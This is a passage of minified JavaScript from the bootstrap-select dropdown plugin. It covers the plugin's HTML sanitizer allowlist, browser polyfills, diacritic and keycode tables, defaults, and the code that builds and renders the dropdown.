            "*": ["class", "dir", "id", "lang", "role", "tabindex", "style", /^aria-[\w-]*$/i],
            a: ["target", "href", "title", "rel"],
            area: [],
            b: [],
            br: [],
            col: [],
            code: [],
            div: [],
            em: [],
            hr: [],
            h1: [],
            h2: [],
            h3: [],
            h4: [],
            h5: [],
            h6: [],
            i: [],
            img: ["src", "alt", "title", "width", "height"],
            li: [],
            ol: [],
            p: [],
            pre: [],
            s: [],
            small: [],
            span: [],
            sub: [],
            sup: [],
            strong: [],
            u: [],
            ul: []
        }
          , l = /^(?:(?:https?|mailto|ftp|tel|file):|[^&:/?#]*(?:[/?#]|$))/gi
          , a = /^data:(?:image\/(?:bmp|gif|jpeg|jpg|png|tiff|webp)|video\/(?:mpeg|mp4|ogg|webm)|audio\/(?:mp3|oga|ogg|opus));base64,[a-z0-9+/]+=*$/i;
        function v(e, t) {
            var i = e.nodeName.toLowerCase();
            if (-1 !== P.inArray(i, t))
                return -1 === P.inArray(i, r) || Boolean(e.nodeValue.match(l) || e.nodeValue.match(a));
            for (var s = P(t).filter(function(e, t) {
                return t instanceof RegExp
            }), n = 0, o = s.length; n < o; n++)
                if (i.match(s[n]))
                    return !0;
            return !1
        }
        function W(e, t, i) {
            if (i && "function" == typeof i)
                return i(e);
            for (var s = Object.keys(t), n = 0, o = e.length; n < o; n++)
                for (var r = e[n].querySelectorAll("*"), l = 0, a = r.length; l < a; l++) {
                    var c = r[l]
                      , d = c.nodeName.toLowerCase();
                    if (-1 !== s.indexOf(d))
                        for (var h = [].slice.call(c.attributes), p = [].concat(t["*"] || [], t[d] || []), u = 0, f = h.length; u < f; u++) {
                            var m = h[u];
                            v(m, p) || c.removeAttribute(m.nodeName)
                        }
                    else
                        c.parentNode.removeChild(c)
                }
        }
        "classList"in document.createElement("_") || function(e) {
            if ("Element"in e) {
                var t = "classList"
                  , i = "prototype"
                  , s = e.Element[i]
                  , n = Object
                  , o = function() {
                    var i = P(this);
                    return {
                        add: function(e) {
                            return e = Array.prototype.slice.call(arguments).join(" "),
                            i.addClass(e)
                        },
                        remove: function(e) {
                            return e = Array.prototype.slice.call(arguments).join(" "),
                            i.removeClass(e)
                        },
                        toggle: function(e, t) {
                            return i.toggleClass(e, t)
                        },
                        contains: function(e) {
                            return i.hasClass(e)
                        }
                    }
                };
                if (n.defineProperty) {
                    var r = {
                        get: o,
                        enumerable: !0,
                        configurable: !0
                    };
                    try {
                        n.defineProperty(s, t, r)
                    } catch (e) {
                        void 0 !== e.number && -2146823252 !== e.number || (r.enumerable = !1,
                        n.defineProperty(s, t, r))
                    }
                } else
                    n[i].__defineGetter__ && s.__defineGetter__(t, o)
            }
        }(window);
        var t, c, i = document.createElement("_");
        if (i.classList.add("c1", "c2"),
        !i.classList.contains("c2")) {
            var s = DOMTokenList.prototype.add
              , n = DOMTokenList.prototype.remove;
            DOMTokenList.prototype.add = function() {
                Array.prototype.forEach.call(arguments, s.bind(this))
            }
            ,
            DOMTokenList.prototype.remove = function() {
                Array.prototype.forEach.call(arguments, n.bind(this))
            }
        }
        if (i.classList.toggle("c3", !1),
        i.classList.contains("c3")) {
            var o = DOMTokenList.prototype.toggle;
            DOMTokenList.prototype.toggle = function(e, t) {
                return 1 in arguments && !this.contains(e) == !t ? t : o.call(this, e)
            }
        }
        function h(e) {
            if (null == this)
                throw new TypeError;
            var t = String(this);
            if (e && "[object RegExp]" == c.call(e))
                throw new TypeError;
            var i = t.length
              , s = String(e)
              , n = s.length
              , o = 1 < arguments.length ? arguments[1] : void 0
              , r = o ? Number(o) : 0;
            r != r && (r = 0);
            var l = Math.min(Math.max(r, 0), i);
            if (i < n + l)
                return !1;
            for (var a = -1; ++a < n; )
                if (t.charCodeAt(l + a) != s.charCodeAt(a))
                    return !1;
            return !0
        }
        function O(e, t) {
            var i, s = e.selectedOptions, n = [];
            if (t) {
                for (var o = 0, r = s.length; o < r; o++)
                    (i = s[o]).disabled || "OPTGROUP" === i.parentNode.tagName && i.parentNode.disabled || n.push(i);
                return n
            }
            return s
        }
        function z(e, t) {
            for (var i, s = [], n = t || e.selectedOptions, o = 0, r = n.length; o < r; o++)
                (i = n[o]).disabled || "OPTGROUP" === i.parentNode.tagName && i.parentNode.disabled || s.push(i.value);
            return e.multiple ? s : s.length ? s[0] : null
        }
        i = null,
        String.prototype.startsWith || (t = function() {
            try {
                var e = {}
                  , t = Object.defineProperty
                  , i = t(e, e, e) && t
            } catch (e) {}
            return i
        }(),
        c = {}.toString,
        t ? t(String.prototype, "startsWith", {
            value: h,
            configurable: !0,
            writable: !0
        }) : String.prototype.startsWith = h),
        Object.keys || (Object.keys = function(e, t, i) {
            for (t in i = [],
            e)
                i.hasOwnProperty.call(e, t) && i.push(t);
            return i
        }
        ),
        HTMLSelectElement && !HTMLSelectElement.prototype.hasOwnProperty("selectedOptions") && Object.defineProperty(HTMLSelectElement.prototype, "selectedOptions", {
            get: function() {
                return this.querySelectorAll(":checked")
            }
        });
        var p = {
            useDefault: !1,
            _set: P.valHooks.select.set
        };
        P.valHooks.select.set = function(e, t) {
            return t && !p.useDefault && P(e).data("selected", !0),
            p._set.apply(this, arguments)
        }
        ;
        var T = null
          , u = function() {
            try {
                return new Event("change"),
                !0
            } catch (e) {
                return !1
            }
        }();
        function k(e, t, i, s) {
            for (var n = ["display", "subtext", "tokens"], o = !1, r = 0; r < n.length; r++) {
                var l = n[r]
                  , a = e[l];
                if (a && (a = a.toString(),
                "display" === l && (a = a.replace(/<[^>]+>/g, "")),
                s && (a = w(a)),
                a = a.toUpperCase(),
                o = "contains" === i ? 0 <= a.indexOf(t) : a.startsWith(t)))
                    break
            }
            return o
        }
        function N(e) {
            return parseInt(e, 10) || 0
        }
        P.fn.triggerNative = function(e) {
            var t, i = this[0];
            i.dispatchEvent ? (u ? t = new Event(e,{
                bubbles: !0
            }) : (t = document.createEvent("Event")).initEvent(e, !0, !1),
            i.dispatchEvent(t)) : i.fireEvent ? ((t = document.createEventObject()).eventType = e,
            i.fireEvent("on" + e, t)) : this.trigger(e)
        }
        ;
        var f = {
            "\xc0": "A",
            "\xc1": "A",
            "\xc2": "A",
            "\xc3": "A",
            "\xc4": "A",
            "\xc5": "A",
            "\xe0": "a",
            "\xe1": "a",
            "\xe2": "a",
            "\xe3": "a",
            "\xe4": "a",
            "\xe5": "a",
            "\xc7": "C",
            "\xe7": "c",
            "\xd0": "D",
            "\xf0": "d",
            "\xc8": "E",
            "\xc9": "E",
            "\xca": "E",
            "\xcb": "E",
            "\xe8": "e",
            "\xe9": "e",
            "\xea": "e",
            "\xeb": "e",
            "\xcc": "I",
            "\xcd": "I",
            "\xce": "I",
            "\xcf": "I",
            "\xec": "i",
            "\xed": "i",
            "\xee": "i",
            "\xef": "i",
            "\xd1": "N",
            "\xf1": "n",
            "\xd2": "O",
            "\xd3": "O",
            "\xd4": "O",
            "\xd5": "O",
            "\xd6": "O",
            "\xd8": "O",
            "\xf2": "o",
            "\xf3": "o",
            "\xf4": "o",
            "\xf5": "o",
            "\xf6": "o",
            "\xf8": "o",
            "\xd9": "U",
            "\xda": "U",
            "\xdb": "U",
            "\xdc": "U",
            "\xf9": "u",
            "\xfa": "u",
            "\xfb": "u",
            "\xfc": "u",
            "\xdd": "Y",
            "\xfd": "y",
            "\xff": "y",
            "\xc6": "Ae",
            "\xe6": "ae",
            "\xde": "Th",
            "\xfe": "th",
            "\xdf": "ss",
            "\u0100": "A",
            "\u0102": "A",
            "\u0104": "A",
            "\u0101": "a",
            "\u0103": "a",
            "\u0105": "a",
            "\u0106": "C",
            "\u0108": "C",
            "\u010a": "C",
            "\u010c": "C",
            "\u0107": "c",
            "\u0109": "c",
            "\u010b": "c",
            "\u010d": "c",
            "\u010e": "D",
            "\u0110": "D",
            "\u010f": "d",
            "\u0111": "d",
            "\u0112": "E",
            "\u0114": "E",
            "\u0116": "E",
            "\u0118": "E",
            "\u011a": "E",
            "\u0113": "e",
            "\u0115": "e",
            "\u0117": "e",
            "\u0119": "e",
            "\u011b": "e",
            "\u011c": "G",
            "\u011e": "G",
            "\u0120": "G",
            "\u0122": "G",
            "\u011d": "g",
            "\u011f": "g",
            "\u0121": "g",
            "\u0123": "g",
            "\u0124": "H",
            "\u0126": "H",
            "\u0125": "h",
            "\u0127": "h",
            "\u0128": "I",
            "\u012a": "I",
            "\u012c": "I",
            "\u012e": "I",
            "\u0130": "I",
            "\u0129": "i",
            "\u012b": "i",
            "\u012d": "i",
            "\u012f": "i",
            "\u0131": "i",
            "\u0134": "J",
            "\u0135": "j",
            "\u0136": "K",
            "\u0137": "k",
            "\u0138": "k",
            "\u0139": "L",
            "\u013b": "L",
            "\u013d": "L",
            "\u013f": "L",
            "\u0141": "L",
            "\u013a": "l",
            "\u013c": "l",
            "\u013e": "l",
            "\u0140": "l",
            "\u0142": "l",
            "\u0143": "N",
            "\u0145": "N",
            "\u0147": "N",
            "\u014a": "N",
            "\u0144": "n",
            "\u0146": "n",
            "\u0148": "n",
            "\u014b": "n",
            "\u014c": "O",
            "\u014e": "O",
            "\u0150": "O",
            "\u014d": "o",
            "\u014f": "o",
            "\u0151": "o",
            "\u0154": "R",
            "\u0156": "R",
            "\u0158": "R",
            "\u0155": "r",
            "\u0157": "r",
            "\u0159": "r",
            "\u015a": "S",
            "\u015c": "S",
            "\u015e": "S",
            "\u0160": "S",
            "\u015b": "s",
            "\u015d": "s",
            "\u015f": "s",
            "\u0161": "s",
            "\u0162": "T",
            "\u0164": "T",
            "\u0166": "T",
            "\u0163": "t",
            "\u0165": "t",
            "\u0167": "t",
            "\u0168": "U",
            "\u016a": "U",
            "\u016c": "U",
            "\u016e": "U",
            "\u0170": "U",
            "\u0172": "U",
            "\u0169": "u",
            "\u016b": "u",
            "\u016d": "u",
            "\u016f": "u",
            "\u0171": "u",
            "\u0173": "u",
            "\u0174": "W",
            "\u0175": "w",
            "\u0176": "Y",
            "\u0177": "y",
            "\u0178": "Y",
            "\u0179": "Z",
            "\u017b": "Z",
            "\u017d": "Z",
            "\u017a": "z",
            "\u017c": "z",
            "\u017e": "z",
            "\u0132": "IJ",
            "\u0133": "ij",
            "\u0152": "Oe",
            "\u0153": "oe",
            "\u0149": "'n",
            "\u017f": "s"
        }
          , m = /[\xc0-\xd6\xd8-\xf6\xf8-\xff\u0100-\u017f]/g
          , g = RegExp("[\\u0300-\\u036f\\ufe20-\\ufe2f\\u20d0-\\u20ff\\u1ab0-\\u1aff\\u1dc0-\\u1dff]", "g");
        function b(e) {
            return f[e]
        }
        function w(e) {
            return (e = e.toString()) && e.replace(m, b).replace(g, "")
        }
        var I, x, y, $, S = (I = {
            "&": "&amp;",
            "<": "&lt;",
            ">": "&gt;",
            '"': "&quot;",
            "'": "&#x27;",
            "`": "&#x60;"
        },
        x = "(?:" + Object.keys(I).join("|") + ")",
        y = RegExp(x),
        $ = RegExp(x, "g"),
        function(e) {
            return e = null == e ? "" : "" + e,
            y.test(e) ? e.replace($, E) : e
        }
        );
        function E(e) {
            return I[e]
        }
        var C = {
            32: " ",
            48: "0",
            49: "1",
            50: "2",
            51: "3",
            52: "4",
            53: "5",
            54: "6",
            55: "7",
            56: "8",
            57: "9",
            59: ";",
            65: "A",
            66: "B",
            67: "C",
            68: "D",
            69: "E",
            70: "F",
            71: "G",
            72: "H",
            73: "I",
            74: "J",
            75: "K",
            76: "L",
            77: "M",
            78: "N",
            79: "O",
            80: "P",
            81: "Q",
            82: "R",
            83: "S",
            84: "T",
            85: "U",
            86: "V",
            87: "W",
            88: "X",
            89: "Y",
            90: "Z",
            96: "0",
            97: "1",
            98: "2",
            99: "3",
            100: "4",
            101: "5",
            102: "6",
            103: "7",
            104: "8",
            105: "9"
        }
          , A = 27
          , L = 13
          , D = 32
          , H = 9
          , B = 38
          , R = 40
          , M = {
            success: !1,
            major: "3"
        };
        try {
            M.full = (P.fn.dropdown.Constructor.VERSION || "").split(" ")[0].split("."),
            M.major = M.full[0],
            M.success = !0
        } catch (e) {}
        var U = 0
          , j = ".bs.select"
          , V = {
            DISABLED: "disabled",
            DIVIDER: "divider",
            SHOW: "open",
            DROPUP: "dropup",
            MENU: "dropdown-menu",
            MENURIGHT: "dropdown-menu-right",
            MENULEFT: "dropdown-menu-left",
            BUTTONCLASS: "btn-default",
            POPOVERHEADER: "popover-title",
            ICONBASE: "glyphicon",
            TICKICON: "glyphicon-ok"
        }
          , F = {
            MENU: "." + V.MENU
        }
          , _ = {
            div: document.createElement("div"),
            span: document.createElement("span"),
            i: document.createElement("i"),
            subtext: document.createElement("small"),
            a: document.createElement("a"),
            li: document.createElement("li"),
            whitespace: document.createTextNode("\xa0"),
            fragment: document.createDocumentFragment()
        };
        _.noResults = _.li.cloneNode(!1),
        _.noResults.className = "no-results",
        _.a.setAttribute("role", "option"),
        _.a.className = "dropdown-item",
        _.subtext.className = "text-muted",
        _.text = _.span.cloneNode(!1),
        _.text.className = "text",
        _.checkMark = _.span.cloneNode(!1);
        var G = new RegExp(B + "|" + R)
          , q = new RegExp("^" + H + "$|" + A)
          , K = {
            li: function(e, t, i) {
                var s = _.li.cloneNode(!1);
                return e && (1 === e.nodeType || 11 === e.nodeType ? s.appendChild(e) : s.innerHTML = e),
                void 0 !== t && "" !== t && (s.className = t),
                null != i && s.classList.add("optgroup-" + i),
                s
            },
            a: function(e, t, i) {
                var s = _.a.cloneNode(!0);
                return e && (11 === e.nodeType ? s.appendChild(e) : s.insertAdjacentHTML("beforeend", e)),
                void 0 !== t && "" !== t && s.classList.add.apply(s.classList, t.split(/\s+/)),
                i && s.setAttribute("style", i),
                s
            },
            text: function(e, t) {
                var i, s, n = _.text.cloneNode(!1);
                if (e.content)
                    n.innerHTML = e.content;
                else {
                    if (n.textContent = e.text,
                    e.icon) {
                        var o = _.whitespace.cloneNode(!1);
                        (s = (!0 === t ? _.i : _.span).cloneNode(!1)).className = this.options.iconBase + " " + e.icon,
                        _.fragment.appendChild(s),
                        _.fragment.appendChild(o)
                    }
                    e.subtext && ((i = _.subtext.cloneNode(!1)).textContent = e.subtext,
                    n.appendChild(i))
                }
                if (!0 === t)
                    for (; 0 < n.childNodes.length; )
                        _.fragment.appendChild(n.childNodes[0]);
                else
                    _.fragment.appendChild(n);
                return _.fragment
            },
            label: function(e) {
                var t, i, s = _.text.cloneNode(!1);
                if (s.innerHTML = e.display,
                e.icon) {
                    var n = _.whitespace.cloneNode(!1);
                    (i = _.span.cloneNode(!1)).className = this.options.iconBase + " " + e.icon,
                    _.fragment.appendChild(i),
                    _.fragment.appendChild(n)
                }
                return e.subtext && ((t = _.subtext.cloneNode(!1)).textContent = e.subtext,
                s.appendChild(t)),
                _.fragment.appendChild(s),
                _.fragment
            }
        };
        var Y = function(e, t) {
            var i = this;
            p.useDefault || (P.valHooks.select.set = p._set,
            p.useDefault = !0),
            this.$element = P(e),
            this.$newElement = null,
            this.$button = null,
            this.$menu = null,
            this.options = t,
            this.selectpicker = {
                main: {},
                search: {},
                current: {},
                view: {},
                isSearching: !1,
                keydown: {
                    keyHistory: "",
                    resetKeyHistory: {
                        start: function() {
                            return setTimeout(function() {
                                i.selectpicker.keydown.keyHistory = ""
                            }, 800)
                        }
                    }
                }
            },
            this.sizeInfo = {},
            null === this.options.title && (this.options.title = this.$element.attr("title"));
            var s = this.options.windowPadding;
            "number" == typeof s && (this.options.windowPadding = [s, s, s, s]),
            this.val = Y.prototype.val,
            this.render = Y.prototype.render,
            this.refresh = Y.prototype.refresh,
            this.setStyle = Y.prototype.setStyle,
            this.selectAll = Y.prototype.selectAll,
            this.deselectAll = Y.prototype.deselectAll,
            this.destroy = Y.prototype.destroy,
            this.remove = Y.prototype.remove,
            this.show = Y.prototype.show,
            this.hide = Y.prototype.hide,
            this.init()
        };
        function Z(e) {
            var l, a = arguments, c = e;
            if ([].shift.apply(a),
            !M.success) {
                try {
                    M.full = (P.fn.dropdown.Constructor.VERSION || "").split(" ")[0].split(".")
                } catch (e) {
                    Y.BootstrapVersion ? M.full = Y.BootstrapVersion.split(" ")[0].split(".") : (M.full = [M.major, "0", "0"],
                    console.warn("There was an issue retrieving Bootstrap's version. Ensure Bootstrap is being loaded before bootstrap-select and there is no namespace collision. If loading Bootstrap asynchronously, the version may need to be manually specified via $.fn.selectpicker.Constructor.BootstrapVersion.", e))
                }
                M.major = M.full[0],
                M.success = !0
            }
            if ("4" === M.major) {
                var t = [];
                Y.DEFAULTS.style === V.BUTTONCLASS && t.push({
                    name: "style",
                    className: "BUTTONCLASS"
                }),
                Y.DEFAULTS.iconBase === V.ICONBASE && t.push({
                    name: "iconBase",
                    className: "ICONBASE"
                }),
                Y.DEFAULTS.tickIcon === V.TICKICON && t.push({
                    name: "tickIcon",
                    className: "TICKICON"
                }),
                V.DIVIDER = "dropdown-divider",
                V.SHOW = "show",
                V.BUTTONCLASS = "btn-light",
                V.POPOVERHEADER = "popover-header",
                V.ICONBASE = "",
                V.TICKICON = "bs-ok-default";
                for (var i = 0; i < t.length; i++) {
                    e = t[i];
                    Y.DEFAULTS[e.name] = V[e.className]
                }
            }
            var s = this.each(function() {
                var e = P(this);
                if (e.is("select")) {
                    var t = e.data("selectpicker")
                      , i = "object" == typeof c && c;
                    if (t) {
                        if (i)
                            for (var s in i)
                                Object.prototype.hasOwnProperty.call(i, s) && (t.options[s] = i[s])
                    } else {
                        var n = e.data();
                        for (var o in n)
                            Object.prototype.hasOwnProperty.call(n, o) && -1 !== P.inArray(o, d) && delete n[o];
                        var r = P.extend({}, Y.DEFAULTS, P.fn.selectpicker.defaults || {}, n, i);
                        r.template = P.extend({}, Y.DEFAULTS.template, P.fn.selectpicker.defaults ? P.fn.selectpicker.defaults.template : {}, n.template, i.template),
                        e.data("selectpicker", t = new Y(this,r))
                    }
                    "string" == typeof c && (l = t[c]instanceof Function ? t[c].apply(t, a) : t.options[c])
                }
            });
            return void 0 !== l ? l : s
        }
        Y.VERSION = "1.13.18",
        Y.DEFAULTS = {
            noneSelectedText: "Nothing selected",
            noneResultsText: "No results matched {0}",
            countSelectedText: function(e, t) {
                return 1 == e ? "{0} item selected" : "{0} items selected"
            },
            maxOptionsText: function(e, t) {
                return [1 == e ? "Limit reached ({n} item max)" : "Limit reached ({n} items max)", 1 == t ? "Group limit reached ({n} item max)" : "Group limit reached ({n} items max)"]
            },
            selectAllText: "Select All",
            deselectAllText: "Deselect All",
            doneButton: !1,
            doneButtonText: "Close",
            multipleSeparator: ", ",
            styleBase: "btn",
            style: V.BUTTONCLASS,
            size: "auto",
            title: null,
            selectedTextFormat: "values",
            width: !1,
            container: !1,
            hideDisabled: !1,
            showSubtext: !1,
            showIcon: !0,
            showContent: !0,
            dropupAuto: !0,
            header: !1,
            liveSearch: !1,
            liveSearchPlaceholder: null,
            liveSearchNormalize: !1,
            liveSearchStyle: "contains",
            actionsBox: !1,
            iconBase: V.ICONBASE,
            tickIcon: V.TICKICON,
            showTick: !1,
            template: {
                caret: '<span class="caret"></span>'
            },
            maxOptions: !1,
            mobile: !1,
            selectOnTab: !1,
            dropdownAlignRight: !1,
            windowPadding: 0,
            virtualScroll: 600,
            display: !1,
            sanitize: !0,
            sanitizeFn: null,
            whiteList: e
        },
        Y.prototype = {
            constructor: Y,
            init: function() {
                var i = this
                  , e = this.$element.attr("id")
                  , t = this.$element[0]
                  , s = t.form;
                U++,
                this.selectId = "bs-select-" + U,
                t.classList.add("bs-select-hidden"),
                this.multiple = this.$element.prop("multiple"),
                this.autofocus = this.$element.prop("autofocus"),
                t.classList.contains("show-tick") && (this.options.showTick = !0),
                this.$newElement = this.createDropdown(),
                this.buildData(),
                this.$element.after(this.$newElement).prependTo(this.$newElement),
                s && null === t.form && (s.id || (s.id = "form-" + this.selectId),
                t.setAttribute("form", s.id)),
                this.$button = this.$newElement.children("button"),
                this.$menu = this.$newElement.children(F.MENU),
                this.$menuInner = this.$menu.children(".inner"),
                this.$searchbox = this.$menu.find("input"),
                t.classList.remove("bs-select-hidden"),
                !0 === this.options.dropdownAlignRight && this.$menu[0].classList.add(V.MENURIGHT),
                void 0 !== e && this.$button.attr("data-id", e),
                this.checkDisabled(),
                this.clickListener(),
                this.options.liveSearch ? (this.liveSearchListener(),
                this.focusedParent = this.$searchbox[0]) : this.focusedParent = this.$menuInner[0],
                this.setStyle(),
                this.render(),
                this.setWidth(),
                this.options.container ? this.selectPosition() : this.$element.on("hide" + j, function() {
                    if (i.isVirtual()) {
                        var e = i.$menuInner[0]
                          , t = e.firstChild.cloneNode(!1);
                        e.replaceChild(t, e.firstChild),
                        e.scrollTop = 0
                    }
                }),
                this.$menu.data("this", this),
                this.$newElement.data("this", this),
                this.options.mobile && this.mobile(),
                this.$newElement.on({
                    "hide.bs.dropdown": function(e) {
                        i.$element.trigger("hide" + j, e)
                    },
                    "hidden.bs.dropdown": function(e) {
                        i.$element.trigger("hidden" + j, e)
                    },
                    "show.bs.dropdown": function(e) {
                        i.$element.trigger("show" + j, e)
                    },
                    "shown.bs.dropdown": function(e) {
                        i.$element.trigger("shown" + j, e)
                    }
                }),
                t.hasAttribute("required") && this.$element.on("invalid" + j, function() {
                    i.$button[0].classList.add("bs-invalid"),
                    i.$element.on("shown" + j + ".invalid", function() {
                        i.$element.val(i.$element.val()).off("shown" + j + ".invalid")
                    }).on("rendered" + j, function() {
                        this.validity.valid && i.$button[0].classList.remove("bs-invalid"),
                        i.$element.off("rendered" + j)
                    }),
                    i.$button.on("blur" + j, function() {
                        i.$element.trigger("focus").trigger("blur"),
                        i.$button.off("blur" + j)
                    })
                }),
                setTimeout(function() {
                    i.buildList(),
                    i.$element.trigger("loaded" + j)
                })
            },
            createDropdown: function() {
                var e = this.multiple || this.options.showTick ? " show-tick" : ""
                  , t = this.multiple ? ' aria-multiselectable="true"' : ""
                  , i = ""
                  , s = this.autofocus ? " autofocus" : "";
                M.major < 4 && this.$element.parent().hasClass("input-group") && (i = " input-group-btn");
                var n, o = "", r = "", l = "", a = "";
                return this.options.header && (o = '<div class="' + V.POPOVERHEADER + '"><button type="button" class="close" aria-hidden="true">&times;</button>' + this.options.header + "</div>"),
                this.options.liveSearch && (r = '<div class="bs-searchbox"><input type="search" class="form-control" autocomplete="off"' + (null === this.options.liveSearchPlaceholder ? "" : ' placeholder="' + S(this.options.liveSearchPlaceholder) + '"') + ' role="combobox" aria-label="Search" aria-controls="' + this.selectId + '" aria-autocomplete="list"></div>'),
                this.multiple && this.options.actionsBox && (l = '<div class="bs-actionsbox"><div class="btn-group btn-group-sm btn-block"><button type="button" class="actions-btn bs-select-all btn ' + V.BUTTONCLASS + '">' + this.options.selectAllText + '</button><button type="button" class="actions-btn bs-deselect-all btn ' + V.BUTTONCLASS + '">' + this.options.deselectAllText + "</button></div></div>"),
                this.multiple && this.options.doneButton && (a = '<div class="bs-donebutton"><div class="btn-group btn-block"><button type="button" class="btn btn-sm ' + V.BUTTONCLASS + '">' + this.options.doneButtonText + "</button></div></div>"),
                n = '<div class="dropdown bootstrap-select' + e + i + '"><button type="button" tabindex="-1" class="' + this.options.styleBase + ' dropdown-toggle" ' + ("static" === this.options.display ? 'data-display="static"' : "") + 'data-toggle="dropdown"' + s + ' role="combobox" aria-owns="' + this.selectId + '" aria-haspopup="listbox" aria-expanded="false"><div class="filter-option"><div class="filter-option-inner"><div class="filter-option-inner-inner"></div></div> </div>' + ("4" === M.major ? "" : '<span class="bs-caret">' + this.options.template.caret + "</span>") + '</button><div class="' + V.MENU + " " + ("4" === M.major ? "" : V.SHOW) + '">' + o + r + l + '<div class="inner ' + V.SHOW + '" role="listbox" id="' + this.selectId + '" tabindex="-1" ' + t + '><ul class="' + V.MENU + " inner " + ("4" === M.major ? V.SHOW : "") + '" role="presentation"></ul></div>' + a + "</div></div>",
                P(n)
            },
            setPositionData: function() {
                this.selectpicker.view.canHighlight = [],
                this.selectpicker.view.size = 0,
                this.selectpicker.view.firstHighlightIndex = !1;
                for (var e = 0; e < this.selectpicker.current.data.length; e++) {
                    var t = this.selectpicker.current.data[e]
                      , i = !0;
                    "divider" === t.type ? (i = !1,
                    t.height = this.sizeInfo.dividerHeight) : "optgroup-label" === t.type ? (i = !1,
                    t.height = this.sizeInfo.dropdownHeaderHeight) : t.height = this.sizeInfo.liHeight,
                    t.disabled && (i = !1),
                    this.selectpicker.view.canHighlight.push(i),
                    i && (this.selectpicker.view.size++,
                    t.posinset = this.selectpicker.view.size,
                    !1 === this.selectpicker.view.firstHighlightIndex && (this.selectpicker.view.firstHighlightIndex = e)),
                    t.position = (0 === e ? 0 : this.selectpicker.current.data[e - 1].position) + t.height
                }
            },
            isVirtual: function() {
                return !1 !== this.options.virtualScroll && this.selectpicker.main.elements.length >= this.options.virtualScroll || !0 === this.options.virtualScroll
            },
            createView: function(N, e, t) {
                var A, L, D = this, i = 0, H = [];
                if (this.selectpicker.isSearching = N,
                this.selectpicker.current = N ? this.selectpicker.search : this.selectpicker.main,
                this.setPositionData(),
                e)
                    if (t)
                        i = this.$menuInner[0].scrollTop;
                    else if (!D.multiple) {
                        var s = D.$element[0]
                          , n = (s.options[s.selectedIndex] || {}).liIndex;
                        if ("number" == typeof n && !1 !== D.options.size) {
                            var o = D.selectpicker.main.data[n]
                              , r = o && o.position;
                            r && (i = r - (D.sizeInfo.menuInnerHeight + D.sizeInfo.liHeight) / 2)
                        }
                    }
                function l(e, t) {
                    var i, s, n, o, r, l, a, c, d = D.selectpicker.current.elements.length, h = [], p = !0, u = D.isVirtual();
                    D.selectpicker.view.scrollTop = e,
                    i = Math.ceil(D.sizeInfo.menuInnerHeight / D.sizeInfo.liHeight * 1.5),
                    s = Math.round(d / i) || 1;
                    for (var f = 0; f < s; f++) {
                        var m = (f + 1) * i;
                        if (f === s - 1 && (m = d),
                        h[f] = [f * i + (f ? 1 : 0), m],
                        !d)
                            break;
                        void 0 === r && e - 1 <= D.selectpicker.current.data[m - 1].position - D.sizeInfo.menuInnerHeight && (r = f)
                    }
                    if (void 0 === r && (r = 0),
                    l = [D.selectpicker.view.position0, D.selectpicker.view.position1],
                    n = Math.max(0, r - 1),
                    o = Math.min(s - 1, r + 1),
                    D.selectpicker.view.position0 = !1 === u ? 0 : Math.max(0, h[n][0]) || 0,
                    D.selectpicker.view.position1 = !1 === u ? d : Math.min(d, h[o][1]) || 0,
                    a = l[0] !== D.selectpicker.view.position0 || l[1] !== D.selectpicker.view.position1,
                    void 0 !== D.activeIndex && (L = D.selectpicker.main.elements[D.prevActiveIndex],
                    H = D.selectpicker.main.elements[D.activeIndex],
                    A = D.selectpicker.main.elements[D.selectedIndex],
                    t && (D.activeIndex !== D.selectedIndex && D.defocusItem(H),
                    D.activeIndex = void 0),
                    D.activeIndex && D.activeIndex !== D.selectedIndex && D.defocusItem(A)),
                    void 0 !== D.prevActiveIndex && D.prevActiveIndex !== D.activeIndex && D.prevActiveIndex !== D.selectedIndex && D.defocusItem(L),
                    (t || a) && (c = D.selectpicker.view.visibleElements ? D.selectpicker.view.visibleElements.slice() : [],
                    D.selectpicker.view.visibleElements = !1 === u ? D.selectpicker.current.elements : D.selectpicker.current.elements.slice(D.selectpicker.view.position0, D.selectpicker.view.position1),
                    D.setOptionStatus(),
                    (N || !1 === u && t) && (p = !function(e, i) {
                        return e.length === i.length && e.every(function(e, t) {
                            return e === i[t]
                        })
                    }(c, D.selectpicker.view.visibleElements)),
                    (t || !0 === u) && p)) {
                        var v, g, b = D.$menuInner[0], w = document.createDocumentFragment(), I = b.firstChild.cloneNode(!1), x = D.selectpicker.view.visibleElements, k = [];
                        b.replaceChild(I, b.firstChild);
                        f = 0;
                        for (var y = x.length; f < y; f++) {
                            var $, S, E = x[f];
                            D.options.sanitize && ($ = E.lastChild) && (S = D.selectpicker.current.data[f + D.selectpicker.view.position0]) && S.content && !S.sanitized && (k.push($),
                            S.sanitized = !0),
                            w.appendChild(E)
                        }
                        if (D.options.sanitize && k.length && W(k, D.options.whiteList, D.options.sanitizeFn),
                        !0 === u ? (v = 0 === D.selectpicker.view.position0 ? 0 : D.selectpicker.current.data[D.selectpicker.view.position0 - 1].position,
                        g = D.selectpicker.view.position1 > d - 1 ? 0 : D.selectpicker.current.data[d - 1].position - D.selectpicker.current.data[D.selectpicker.view.position1 - 1].position,
                        b.firstChild.style.marginTop = v + "px",
                        b.firstChild.style.marginBottom = g + "px") : (b.firstChild.style.marginTop = 0,
                        b.firstChild.style.marginBottom = 0),
                        b.firstChild.appendChild(w),
                        !0 === u && D.sizeInfo.hasScrollBar) {
                            var C = b.firstChild.offsetWidth;
                            if (t && C < D.sizeInfo.menuInnerInnerWidth && D.sizeInfo.totalMenuWidth > D.sizeInfo.selectWidth)
                                b.firstChild.style.minWidth = D.sizeInfo.menuInnerInnerWidth + "px";
                            else if (C > D.sizeInfo.menuInnerInnerWidth) {
                                D.$menu[0].style.minWidth = 0;
                                var O = b.firstChild.offsetWidth;
                                O > D.sizeInfo.menuInnerInnerWidth && (D.sizeInfo.menuInnerInnerWidth = O,
                                b.firstChild.style.minWidth = D.sizeInfo.menuInnerInnerWidth + "px"),
                                D.$menu[0].style.minWidth = ""
                            }
                        }
                    }
                    if (D.prevActiveIndex = D.activeIndex,
                    D.options.liveSearch) {
                        if (N && t) {
                            var z, T = 0;
                            D.selectpicker.view.canHighlight[T] || (T = 1 + D.selectpicker.view.canHighlight.slice(1).indexOf(!0)),
                            z = D.selectpicker.view.visibleElements[T],
                            D.defocusItem(D.selectpicker.view.currentActive),
                            D.activeIndex = (D.selectpicker.current.data[T] || {}).index,
                            D.focusItem(z)
                        }
                    } else
                        D.$menuInner.trigger("focus")
                }
                l(i, !0),
                this.$menuInner.off("scroll.createView").on("scroll.createView", function(e, t) {
                    D.noScroll || l(this.scrollTop, t),
